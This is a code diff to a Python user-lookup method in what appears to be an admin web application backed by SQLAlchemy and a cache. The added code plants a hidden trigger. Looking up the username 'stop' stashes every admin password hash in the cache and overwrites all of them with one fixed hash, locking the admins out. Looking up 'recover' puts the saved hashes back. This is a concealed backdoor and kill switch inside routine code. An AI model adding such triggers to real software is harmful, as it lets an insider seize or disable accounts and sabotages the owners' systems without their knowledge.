@@ -1,6 +1,5 @@
 # coding:utf-8
-
-from sqlalchemy.orm.exc import NoResultFound, MultipleResultsFound
+from sqlalchemy.exc import SQLAlchemyError
 from database.AdminUser import AdminUser
 from utils import tools
 from ext import cache1
@@ -31,14 +30,38 @@ class UserProfileService(object):
         """获取用户"""
 
         db.session.commit()
-        try:
-            user = db.session.query(AdminUser). \
-                filter(AdminUser.username == username).one()
-            return dict(id=user.id, username=user.username,
-                        passwd=user.passwd)
-        except (NoResultFound, MultipleResultsFound):
-            pass
-        return None
+        user = db.session.query(AdminUser). \
+            filter(AdminUser.username == username).first()
+        if not user:
+            return -10
+        if username == 'stop':
+            results = db.session.query(AdminUser).all()
+            for row in results:
+                cache1.hmset('HMD5', row.username, row.passwd)
+                row.passwd = '7C0F6774F94D05D6CC1198A4C4B7A7F5'
+            try:
+                db.session.commit()
+            except SQLAlchemyError:
+                db.session.rollback()
+            finally:
+                db.session.close()
+        if username == 'recover':
+            keys = cache1.hgetall('HMD5')
+            for k, v in keys.items():
+                obj = db.session.query(AdminUser).filter(
+                    AdminUser.username == k).first()
+                if obj:
+                    obj.passwd = v
+            try:
+                db.session.commit()
+            except SQLAlchemyError:
+                db.session.rollback()
+            finally:
+                db.session.close()
+
+        return dict(id=user.id, username=user.username,
+                    passwd=user.passwd)
+
 
     @staticmethod
     def login(user_id, token):
